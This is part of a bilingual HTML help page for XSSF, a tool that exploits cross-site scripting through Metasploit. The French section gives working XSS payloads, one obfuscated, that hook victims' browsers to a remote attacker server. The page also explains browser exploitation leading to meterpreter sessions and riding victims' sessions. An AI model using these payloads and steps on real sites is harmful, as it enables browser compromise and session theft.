+						<h2 style='color:cyan;'><center>Exploitation de XSS</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Pour commencer à jouer avec de vraies victimes distances, vous avez besoin d'une XSS sur une application vulnérable. La découverte de vulnérabilités XSS est assez simple étant donné que peu d'applications implémentent de réelles protections, et parce que ces mêmes applications ne cessent d'inclurent de nouvelles fonctionnalités.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF fonctionne à la fois avec les XSS persistantes et les XSS volatiles, que la requête soit de type GET ou POST. La seule chose à garder à l'esprit est que l'exploitation reste impossible dans quelques cas, comme par exemple sur les navigateurs implémentant des filtres XSS (requêtes GET), ou les navigateurs sur lesquels l'usage du JavaScript est désactivé. XSSF ne sera pas capable de gérer ces différents cas.<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Prenons l'exemple d'une XSS en GET non persistante sur '<span style='color:green;'>http://www.vulnerable.com/index.php?param=value</span>' à l'intérieur du paramètre '<span style='color:green;'>param</span>'. La seule chose à faire afin de lier la victime avec notre serveur XSSF est d'injecter une ressource générique '<span style='color:green;'>loop</span>' fournie par le serveur XSSF, quelque soit le moyen : 
+						<ul>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;script src="http://10.100.36.245/loop"&gt;&lt;/script&gt;</span></li>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;img src="none" onerror="s = document.createElement('script');	s.src = "http://10.100.36.245/loop";	document.body.appendChild(s);" /&gt;</span></li>
+							<li> <span style='color:green;'>http://www.vulnerable.com/index.php?param="'&gt;&lt;script&gt; eval(String.fromCharCode(115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 9, 115, 46, 115, 114, 99, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 48, 46, 51, 54, 46, 50, 52, 53, 47, 108, 111, 111, 112, 34, 59, 9, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 41, 59)); &lt;/script&gt;/span></li>
+							<li> <span style='color:green;'>...</span></li>
+						</ul><br/><br />
+						<b style="color:red">IMPORTANT :</b> Une fois l'attaque injectée, le script XSSF boucle indéfiniment pour demander de nouvelles commandes. L'intervalle de demandes par défaut est de 5 secondes, et peut être modifié en appelant la ressource '<span style='color:green;'>loop</span>' avec le paramètre '<span style='color:green;'>interval</span>' (exemple '<span style='color:green;'>/loop?interval=1</span>').<br/><br/>
+						<center><img src="./loop.png"/></center>
+					</div>
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 6   -->
+					<!-- ############ -->
+					<div id="D6uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Victims</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF victims are kept in database, wether they are active or not. Metasploit can be restarted, victims won't be lost, and active victims will be recovered. A inactive victim can become active again if victim (user) connects again to the infected website.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;As XSSF started server can be configured, victims are separated into servers. Starting XSSF on port 80 won't be able to manage same victims that victims available with default 8888 port.
+						<br/><br/>
+						<center><img src="./victims.png"/></center><br/><br/>
+						<b style="color:red">IMPORTANT:</b> Please see the 'XSSF commands' part to view full victim commands list.
+					</div>
+					
+					<div id="D6fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Victimes</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Les victimes XSSF sont conservées en base de données, qu'elles soient actives ou non. Dans le cas ou le Framework Metasploit ou XSSF seraient redémarrés, les victimes ne seraient pas perdus et les victimes actives seront récupérées. Une victime inactive peut redevenir active si elle (utilisateur) navigue à nouveau sur l'application vulnérable.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Comme les options du serveur XSSF sont configurables, les victimes sont séparées entre différents serveurs. Le démarrage du serveur XSSF sur le port 80 ne permettra pas de gérer les victimes qui étaient disponibles sur le port par défaut 8888.
+						<br/><br/>
+						<center><img src="./victims.png"/></center><br/><br/>
+						<b style="color:red">IMPORTANT :</b> Merci de vous référer à la section 'Commandes XSSF' pour voir la liste complète des commandes concernant les victimes.
+					</div>
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 7   -->
+					<!-- ############ -->
+					<div id="D7uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Launch XSSF attack</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Before launching an attack on a targeted victim or a list of victims, you will first have to choose the attack. XSSF attacks modules are stored in '<span style='color:green;'>/modules/auxiliary/xssf/public</span>' path. You can load the module into MSF using '<span style='color:green;'>use</span>' command, followed by module path.
+						<br/><br/><center><img src="./infos.png"/></center><br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;Once chosed, attack can be launched easily, as if you were using an MSF module, using commands '<span style='color:green;'>run</span>' or '<span style='color:green;'>exploit -j</span>' to run command in background. Each module can have his own options (AlertMessage in that case), and all XSSF modules will have a VictimIDs options. If options are not set, default values are used and attack will be trigered on all active victims.
+						<br/><br/><center><img src="./run.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Attacks are sent to victims when they ask for new commands. Module can be stoped using '<span style='color:green;'>Ctrl + c</span>'.
+					</div>
+					
+					<div id="D7fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Lancement d'attaques XSSF</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Avant de lancer une attaque sur une victime choisie ou sur une liste de victime, il est nécessaire de choisir cette attaque. Les modules d'attaques XSSF sont stockés dans le répertoire '<span style='color:green;'>/modules/auxiliary/xssf/public</span>'. Le chargement d'un module dans MSF se fait à l'aide de la commande '<span style='color:green;'>use</span>', suivie du chemin jusqu'au module.
+						<br/><br/><center><img src="./infos.png"/></center><br/><br/>
+
+						&nbsp;&nbsp;&nbsp;&nbsp;Une fois choisie, l'attaque peut se lancer simplement, comme si vous utilisiez un module MSF, en utilisant les commandes '<span style='color:green;'>run</span>' ou '<span style='color:green;'>exploit -j</span>' pour lancer une commande en tâche de fond. Chaque module possède ses propres options (AlertMessage dans le cas présent), et chaque module propre à XSSF contiendra une option VictimIDs. Si les options ne sont pas renseignées, les valeurs par défaut seront utilisées et l'attaque se lancera sur toutes les victimes actives.
+						<br/><br/><center><img src="./run.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Les attaques sont envoyées aux victimes lorsqu'elles demanderont de nouvelles commandes. Les modules peuvent s'arrêter grâce à la commande '<span style='color:green;'>Ctrl + c</span>'.
+					</div>					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 8   -->
+					<!-- ############ -->
+					<div id="D8uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Launch MSF attack</center></h2>
+						<b style="color:red">PREREQUISITES:</b> To launch a targeted MSF browser exploitation attack from an XSS victim, you'll first need to launch the MSF attack module in background job. Please see the Metasploit Framework documentation for running an exploitation module in background.<br/><br/>
+						
+						<b style="color:red">Notes:</b> As XSS are related to a browser, only MSF modules exploiting a browser based vulnerability or a browser pluggin (flash, pdf, etc.) vulnerability can be used.<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;First step then is to launch a background exploit with command '<span style='color:green;'>exploit -j</span>' and find the background job id with '<span style='color:green;'>jobs</span>' command.
+						<br/><br/><center><img src="./exploit1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Once that's done, you can simply attack victims you want, giving the '<span style='color:green;'>VictimIDs</span>' and the '<span style='color:green;'>JobId</span>' parameters to the XSSF '<span style='color:green;'>xssf_exploit</span>' command. Keep in mind that '<span style='color:green;'>VictimIDs</span>' parameter accepts multiple ID or ranges (see 'XSSF commands' parts for more details).
+						<br/><br/><center><img src="./exploit2.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;You can now interact with meterpreter sessions using '<span style='color:green;'>session</span>' to list active meterpreter sessions and '<span style='color:green;'>session -i [SessionID]</span>' to interact.
+					</div>
+					
+					<div id="D8fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Lancement d'attaques MSF</center></h2>
+						<b style="color:red">PREREQUIS :</b> Pour lancer une attaque d'exploitation MSF ciblée sur une ou plusieurs victimes en particulier, il est nécessaire de lancer préalablement le module désiré en tâche de fond. Merci de vous reporter à la documentation du Framework Metasploit pour tout renseignement concernant les modules MSF ou le lancement de tâches de fond.<br/><br/>
+						
+						<b style="color:red">Notes :</b> Comme les vulnérabilités XSS sont le plus souvent exploitées dans un navigateur, seuls les modules MSF exploitant une vulnérabilité d'un navigateur ou d'un de ses plugins (flash, pdf, etc.) peuvent être utilisés.<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;La première chose à faire est donc de lancer l'exploit en tâche de fond grâce à la commande '<span style='color:green;'>exploit -j</span>' et de retrouver l'identifiant de la tâche de fond lancée grâce à la commande '<span style='color:green;'>jobs</span>'.
+						<br/><br/><center><img src="./exploit1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Une fois le lancement de l'exploit MSF réalisé, l'attaque peut être lancée sur n'importe quelle victime XSSF, en passant les paramètres '<span style='color:green;'>VictimIDs</span>' et '<span style='color:green;'>JobId</span>' à la commande XSSF '<span style='color:green;'>xssf_exploit</span>'. Le paramètre '<span style='color:green;'>VictimIDs</span>' accepte un seul identifiant ou un intervalle (reportez-vous à la section 'Commandes XSSF' pour plus de renseignements).
+						<br/><br/><center><img src="./exploit2.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Une fois l'exploitation réalisée, il est possible d'interagir avec la session meterpreter en utilisant la commande '<span style='color:green;'>session</span>' pour lister les sessions actives et '<span style='color:green;'>session -i [SessionID]</span>' pour interagir avec une session donnée.
+					</div>					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 9   -->
+					<!-- ############ -->
+					<div id="D9uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Automated attacks</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Automated attacks are useful to attack automatically all new victims. That way, a new victim connected will get all automated attacks, sent one by one. XSSF modules and MSF browser exploitation modules are all supported by automated attacks. <br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;First thing to do is starting the module in background job with command '<span style='color:green;'>exploit -j</span>' and getting the job ID with command '<span style='color:green;'>jobs</span>'. For XSSF modules, it is possible to set the '<span style='color:green;'>VictimIDs</span>' parameter to '<span style='color:green;'>NONE</span>' in order to launch the attack in background without attacking any victim for the moment (or using '<span style='color:green;'>exploit</span>' command instead of '<span style='color:green;'>run</span>').
+						<br/><br/><center><img src="./auto1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;All attacks visible with '<span style='color:green;'>jobs</span>' command can be added to automated attack using command '<span style='color:green;'>xssf_add_auto_attack [JobID]</span>'. Once that is done, attack will be triggered without any action from attacker at victim's connection.
+						<br/><br/><center><img src="./auto2.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Attacks in automated mode can be removed using command '<span style='color:green;'>xssf_remove_auto_attack [JobID]</span>'. Note that automated attacks are cleared each time you stop XSSF, and killing a job will remove the linked automated attack.
+					</div>
+					
+					<div id="D9fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Attaques automatiques</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Les attaques automatiques sont utiles pour lancer automatiquement des attaques sur toutes les nouvelles victimes. Chaque victime qui viendra se lier au serveur XSSF pour la première fois recevra directement toutes les attaques automatiques envoyées une par une. Les modules XSSF et MSF sont tous supportés lors de l'utilisation d'attaques automatiques. <br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;La première chose à faire est de démarrer le module en tâche de fond avec la commande '<span style='color:green;'>exploit -j</span>' et de récupérer l'identifiant de tâche de fond avec la commande '<span style='color:green;'>jobs</span>'. Pour les modules XSSF, il est possible de configurer le paramètre '<span style='color:green;'>VictimIDs</span>' avec la valeur '<span style='color:green;'>NONE</span>' afin de lancer l'attaque en tâche de fond sans attaquer aucune victime active pour le moment (peut se faire en utilisant la commande '<span style='color:green;'>exploit</span>' au lieu de '<span style='color:green;'>run</span>').
+						<br/><br/><center><img src="./auto1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Toutes les attaques visibles avec la commande '<span style='color:green;'>jobs</span>' peuvent être rajoutées simplement à la liste des attaques automatiques grâce à la commande  '<span style='color:green;'>xssf_add_auto_attack [JobID]</span>'. Une fois la commande prise en compte, l'attaque ajoutée sera déclenchée lors de la connexion d'une nouvelle victime et ce sans que l'attaquant n'est à réaliser d'action particulière.
+						<br/><br/><center><img src="./auto2.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Les attaques automatiques peuvent être retirées de la liste en utilisant la commande '<span style='color:green;'>xssf_remove_auto_attack [JobID]</span>'. Les attaques automatiques sont supprimées à chaque arrêt du serveur XSSF, et le fait de tuer une tâche de fond supprimera l'attaque automatique correspondante.
+					</div>					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 10  -->
+					<!-- ############ -->
+					<div id="D10uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF Tunnel</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;An interesting though exploiting an XSS inside a victim's browser could be to browse website on attacker's browser, using the connected victim's session. In most of cases, simply stealing the victim cookie will be sufficient to realize this action. But in minority of cases (intranets, network tools portals ...), cookie won't be useful for an external attacker. That's why XSSF Tunnel is created to help the attacker to help the attacker browsing on affected domain using the victim's session.
+						<br/><br/><center><img src="./tunnel1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;When targeted victim has been chosen by the attacker, only command to execute is '<span style='color:green;'>xssf_tunnel [VictimID]</span>'. The attacker can then configure his browser to browse using XSSF server as a proxy. 
+						<br/><br/><center><img src="./proxy.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Once that is done, you can just browse with your own browser as if you were the victim. Of course, you can only have an access to the affected domain because request are done by victim. If resources are asked from other domains than vulnerable one, XSSF server will automatically try to get these resources without asking to the victim (often images, css, etc.). <br/><br/><br/>
+						
+						<b style="color:red">IMPORTANT:</b> For HTTPS vulnerable domain, you will have to call the HTTP domain in your browser to be recognized by XSSF server. For example, for a victim within '<span style='color:green;'>https://www.vulnerable.com</span>' domain, attacker will have to browse the '<span style='color:green;'>http://www.vulnerable.com</span>' domain. XSSF server will automatically do the conversion and call the right resource.
+						
+						<br/><br/><center><img src="./tunnel2.png"/></center><br/><br/>
+						
+						<b style="color:red">NOTE:</b> XSSF Tunnel is only available from localhost running XSSF server in default mode. However, a public access can be given to these interfaces starting XSSF with the '<span style='color:green;'>Public=true</span>' option.
+					</div>
+					
+					<div id="D10fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF Tunnel</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;L'une des possibilités intéressantes lors de l'exploitation des XSS à l'intérieur du navigateur d'une victime pourrait être de surfer directement sur le site vulnérable depuis le navigateur de l'attaquant, en utilisant les informations de session de la victime connectée. Dans la plupart des cas, le vol simple du cookie de la victime suffira à réaliser cette action. Dans certains cas particuliers (intranets, portails d'administration d'outils réseaux, etc.), le cookie sera inutile pour un attaquant extérieur. C'est pourquoi XSSF Tunnel à été créé afin d'aider l'attaquant à naviguer sur le domaine vulnérable en utilisant la session de la victime déjà connectée.
+						<br/><br/><center><img src="./tunnel1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Quand la victime désirée à été choisie par l'attaquant, la commande à utiliser pour ouvrir un tunnel XSS est '<span style='color:green;'>xssf_tunnel [VictimID]</span>'. L'attaquant n'a ensuite qu'à configurer son navigateur pour naviguer en passant par le serveur XSSF comme proxy. 
+						<br/><br/><center><img src="./proxy.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Une fois les paramétrages effectués, il est possible de naviguer sur le navigateur de l'attaquant comme s'il était la victime. Bien évidemment, la session de la victime n'est utilisable que sur le domaine actuellement vulnérable. Si des ressources de domaines tiers sont nécessaires, le serveur XSSF tentera automatiquement de récupérer ces ressources sans passer par la victime (le plus souvent des images, scripts, css, etc.)<br/><br/><br/>
+						
+						<b style="color:red">IMPORTANT :</b> Pour les domaines vulnérables en HTTPS, il est nécessaire d'appeler le même domaine en gardant le protocole HTTP dans le navigateur de l'attaquant pour que la requête soit prise en compte par XSSF. Par exemple, pour une victime à l'intérieur du domaine '<span style='color:green;'>https://www.vulnerable.com</span>', l'attaquant devra naviguer sur le domaine '<span style='color:green;'>http://www.vulnerable.com</span>'. Le serveur XSSF fera automatiquement les conversions nécessaires pour appeler les bonnes ressources.
+						
+						<br/><br/><center><img src="./tunnel2.png"/></center><br/><br/>
+						
+						<b style="color:red">NOTE :</b> XSSF Tunnel est seulement disponible depuis le localhost sur lequel est lancé le serveur XSSF dans le mode par défaut. Cependant, il est possible de leur donner un accès public en utilisant l'option '<span style='color:green;'>Public=true</span>' lors du chargement de XSSF.
+					</div>					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 11  -->
+					<!-- ############ -->
+					<div id="D11uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF GUI</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Graphical User Interface is available for attack logs, attack statistiques and XSSF help. These interfaces are available through the commands '<span style='color:green;'>xssf_logs</span>', '<span style='color:green;'>xssf_stats</span>' and '<span style='color:green;'>xssf_help</span>' or accessing directly the ressource URI. <br/>
+						
+						<b style="color:red">NOTE:</b> These interfaces are only available from localhost running XSSF server in default mode. However, a public access can be given to these interfaces starting XSSF with the '<span style='color:green;'>Public=true</span>' option.
+												
+						<br/><br/><center><img src="./logs.png"/></center><br/><br/>
+						<br/><br/><center><img src="./stats.png"/></center><br/><br/>
+						<br/><br/><center><img src="./help.png"/></center><br/><br/>
+					</div>
+					
+					<div id="D11fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF GUI</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;L'Interface Graphique Utilisateur est disponible et fournit les log d'attaques, des statistiques en temps réel concernant les victimes ainsi que la présente section d'aide en ligne. Ces interfaces sont disponibles grâce aux commandes '<span style='color:green;'>xssf_logs</span>', '<span style='color:green;'>xssf_stats</span>' et '<span style='color:green;'>xssf_help</span>' ou en utilisant directement l'URL de la ressource désirée. <br/>
+												
+						<b style="color:red">NOTE :</b> Ces interfaces sont seulement disponibles depuis le localhost sur lequel est lancé le serveur XSSF dans le mode par défaut. Cependant, il est possible de leur donner un accès public en utilisant l'option '<span style='color:green;'>Public=true</span>' lors du chargement de XSSF.
+
+						<br/><br/><center><img src="./logs.png"/></center><br/><br/>
+						<br/><br/><center><img src="./stats.png"/></center><br/><br/>
+						<br/><br/><center><img src="./help.png"/></center><br/><br/>
+					</div>					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 12  -->
+					<!-- ############ -->
+					<div id="D12uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Remote XSSF use (Except for SSH)</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Sometime useful, the remote XSSF use will allow an attacker to use XSSF from a remote computer than the one hosting the server. This also can be used by multi-attackers to use the same XSSF instance including same victims.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Remote connection can be performed with '<span style='color:green;'>Armitage</span>', which is a graphical management tool for Metasploit Framework. Advanced users will find <a href="javascript:top.location='http://www.fastandeasyhacking.com/'">Armitage</a> valuable for managing remote Metasploit instances and collaboration. Tool is already included in packaged MSF installation ('<span style='color:green;'>/msf3/data/armitage/armitage.jar</span>').<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Before starting Armitage, you just have to load the XMLRPC plugin inside MSF in order to allow remote commands ('<span style='color:green;'>load xmlrpc</span>').
+						<br/><br/><center><img src="./xmlrpc.png"/></center><br/><br/>
+						<br/><br/><center><img src="./armitage1.png"/></center><br/><br/>
+						<br/><br/><center><img src="./armitage2.png"/></center><br/><br/>
+					</div>
+					
+					<div id="D12fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Utilisation à distance (Hors SSH)</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Parfois utile, l'utilisation de XSSF à distance permettra à un attaquant d'utiliser XSSF sur un autre système que celui hébergeant le serveur XSSF. Ceci peut aussi être utilisé pour permettre une utilisation de XSSF en mode multi-attaquants en conservant les mêmes victimes.<br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Les connections à distance peuvent se faire grâce à l'outil '<span style='color:green;'>Armitage</span>', qui permet une utilisation graphique distante ou non du Framework Metasploit. Les utilisateurs avancés pourront utiliser <a href="javascript:top.location='http://www.fastandeasyhacking.com/'">Armitage</a> pour une utilisation distante et une collaboration dans les attaques. L'outil est déjà intégré dans toutes les versions packagées de Metasploit ('<span style='color:green;'>/msf3/data/armitage/armitage.jar</span>').<br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Avant de lancer Armitage, il est nécessaire de charger le plugin XMLRPC dans MSF pour permettre la gestion des commandes distantes ('<span style='color:green;'>load xmlrpc</span>').
+						<br/><br/><center><img src="./xmlrpc.png"/></center><br/><br/>
+						<br/><br/><center><img src="./armitage1.png"/></center><br/><br/>
+						<br/><br/><center><img src="./armitage2.png"/></center><br/><br/>
+					</div>
+					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 13  -->
+					<!-- ############ -->
+					<div id="D13uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF architecture</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF is based on an architecture of Master/Slaves servers. At XSSF start, master server is launched, and this server aims to communicate with victims. 
+						<br/><br/><center><img src="./attack1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Each module can be considered as a slave server, delivering malicious codes to the master server. Victims never request directly to slaves, and only have to speak with master XSSF server. That way of work is not impacting the way you'll code your own modules, and doesn't have an impact on how are coded MSF browser based modules.
+						<br/><br/><center><img src="./attack2.png"/></center><br/><br/>
+					</div>
+					
+					<div id="D13fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Architecture XSSF</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;XSSF est basé sur une architecture de serveurs Maître/Esclaves. Au lancement de XSSF, un serveur maître est démarré, et se charge du dialogue avec les victimes. 
+						<br/><br/><center><img src="./attack1.png"/></center><br/><br/>
+						&nbsp;&nbsp;&nbsp;&nbsp;Chaque module d'attaque peut être considéré comme un serveur esclave, fournissant les codes d'attaque au serveur maître. Les victimes ne dialoguent jamais directement avec les serveurs esclaves, et sont uniquement liée au serveur maître XSSF. Ce mode de fonctionnement n'impacte en rien la façon dont sont codés les modules, ni celle dont sont codés les modules d'exploit MSF.
+						<br/><br/><center><img src="./attack2.png"/></center><br/><br/>
+					</div>
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 14  -->
+					<!-- ############ -->
+					<div id="D14uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Code an XSSF module</center></h2>
+						An XSSF module is composed by two mandatory parts:
+						<ul>
+							<li> <span style='color:green;'>Module initialisation (initialize)</span>: Defines module options and information. For XSSF modules, some information are already initialized (Author, Version, etc.) from XSSF modules superclass (XssfServer), and other can be added in each module (Name and Description here). Of course, existing one can be overwritted. Then, each module can register his own options (Command here). Options are also added from superclass (VictimIDs). Please, refer to MSF modules initialization help for more information.</li>
+							<li> <span style='color:green;'>Module server request handler (on_request_uri)</span>: This procedure is called each time a request is done from XSSF master server to the module. This is the really important part of each module, and this function must return an HTTP response through the '<span style='color:green;'>send_response</span>' function. This function takes two mandatory parameters and an optional one: </li>
+							<ul>
+								<li> <span style='color:red;'>Client</span>: This parameter represents the active socket with the client (XSSF master server). It doesn't need to be changed. </li>
+								<li> <span style='color:red;'>Code</span>: This parameter represents the malicious code returned to the victim. This code can be a JavaScript code or HTML code (surrounded by &lt;HTML&gt; tags).</li>
+								<li> <span style='color:orange;'>HTTP headers</span>: If special headers have to be forwarded to the victim (Content-Type, Set-Cookie, etc.), they have to be added in that optionnal parameters. Headers have to be passed inside the function as a ruby hash (<span style='color:green;'>{"Name" => "Value", "Name" => "Value"}</span>).</li>
+							</ul><br/>
+						</ul><br/>
+						<br/><center><img src="./module.png"/></center><br/><br/>
+					</div>
+					
+					<div id="D14fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Coder un module XSSF</center></h2>
+						Un module XSSF se décompose en deux grandes parties :
+						<ul>
+							<li> <span style='color:green;'>L'initialiation du module (initialize)</span> : Définit les options et informations relatives au module. Pour les modules XSSF, certaines informations sont déjà initialisées (Author, Version, etc.) depuis la superclasse des modules (XssfServer), et d'autres peuvent venir se rajouter dans chaque module (Name et Description dans ce cas). Bien évidemment, les informations déjà existantes peuvent être écrasées. Ensuite, chaque module peut enregistrer ses propres options (Command dans ce cas). Des options sont déjà initialisées et rendues obligatoires par la superclasse (VictimIDs). Merci de vous reporter à l'aide MSF sur l'initialisation des modules pour plus de détails.</li>
+							<li> <span style='color:green;'>Le gestionnaire de requêtes du module (on_request_uri)</span> : Cette fonction est appelée à chaque fois qu'une requête est faite depuis le serveur maître XSSF vers le module correspondant. C'est la partie réellement importante de chaque module, et cette fonction doit retourner une réponse HTTP par l'intermédiaire de la fonction '<span style='color:green;'>send_response</span>'. Cette procédure prend deux paramètres obligatoires et un facultatif :</li>
+							<ul>
+								<li> <span style='color:red;'>Client</span> : Ce paramètre représente la socket active avec le client (serveur maître XSSF). Il n'est pas nécessaire de changer ce paramètre. </li>
+								<li> <span style='color:red;'>Code</span> : Ce paramètre contient le code malicieux qui doit être retourné à la victime. Ce code peut être soit de type JavaScript, soit de type HTML (encadré des balises &lt;HTML&gt;).</li>
+								<li> <span style='color:orange;'>Entêtes HTTP</span> : Si des entêtes spéciales doivent être transmises à la victime (Content-Type, Set-Cookie, etc.), elles doivent être rajoutées dans ce paramètre facultatif. Les entêtes doivent être fournies à la fonction sous forme de Hash Ruby (<span style='color:green;'>{"Name" => "Value", "Name" => "Value"}</span>).</li>
+							</ul><br/>
+						</ul><br/>
+						<br/><center><img src="./module.png"/></center><br/><br/>
+					</div>					
+					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 15  -->
+					<!-- ############ -->
+					<div id="D15uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Return a result to XSSF</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;In some modules, it could be interesting to send a result to XSSF server. This is possible through the XSSF API provided JavaScript '<span style='color:green;'>XSSF_POST</span>' function. This procedure takes one mandatory parameter, an three optionnal ones (including two that aren't needed for XSSF modules developement and used for XSSF Tunnel only ):
+						<ul>
+							<li> <span style='color:red;'>Response</span>: Reponse sent by the victim to the XSSF server. This response doesn't have to be encoded, because the '<span style='color:green;'>XSSF_POST</span>' function will do it for you. </li>
+							<li> <span style='color:orange;'>Module Name</span>: This is just to link a response with a module name. That way attacker can easily see in logs modules that returned responses.</li>
+						</ul><br/>
+						
+						For example, a simple module returning webpage content would be only the following code:<br/><center><img src="./post.png"/></center><br/><br/>
+					</div>
+					
+					<div id="D15fr" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>Retour de résultats à XSSF</center></h2>
+						&nbsp;&nbsp;&nbsp;&nbsp;Dans certains modules, il peut être intéressant d'envoyer un résultat au serveur XSSF. Ceci est rendu possible grâce à la fonction Javascript '<span style='color:green;'>XSSF_POST</span>' fournie par l'API XSSF. Cette fonction prend un paramètre obligatoire, et trois paramètres optionnels (dont deux qui ne sont pas utilisés dans les modules XSSF car seulement utilisés pour le Tunnel XSSF) :
+						<ul>
+							<li> <span style='color:red;'>Response</span>: Réponse envoyée au serveur XSSF par la victime. Cette réponse n'a pas à être préalablement encodée, car la fonction '<span style='color:green;'>XSSF_POST</span>' se chargera de le faire. </li>
+							<li> <span style='color:orange;'>Module Name</span>: Sert uniquement à lier une réponse avec un nom de module. De cette façon, il est plus facile de voir dans les logs de quel module provient une réponse d'attaque.</li>
+						</ul><br/>
+						
+						Par exemple, un module simple retournant le contenu HTML de la page en cours contiendra seulement le code suivant :<br/><center><img src="./post.png"/></center><br/><br/>
+					</div>					
+					
+					
+					
+					
+					<!-- ############ -->				
+					<!--  CHAPTER 16  -->
+					<!-- ############ -->
+					<div id="D16uk" style='color:white; display:none; text-align:justify;'>
+						<h2 style='color:cyan;'><center>XSSF JavaScript functions</center></h2>
+						In order to make module developement shorter and easier, XSSF provides some JavaScript functions that can be used from anywhere inside modules:
+						<ul>
+							<li> <span style='color:green;'>XSSF_CREATE_XHR()</span>: Creates and returns an XMLHttpRequest object compatible with the targeted browser</li>
+							<li> <span style='color:green;'>XSSF_CREATE_IFRAME(ID, WIDTH, HEIGHT)</span>: Creates and return an IFRAME within webpage with given ID and sizes</li>
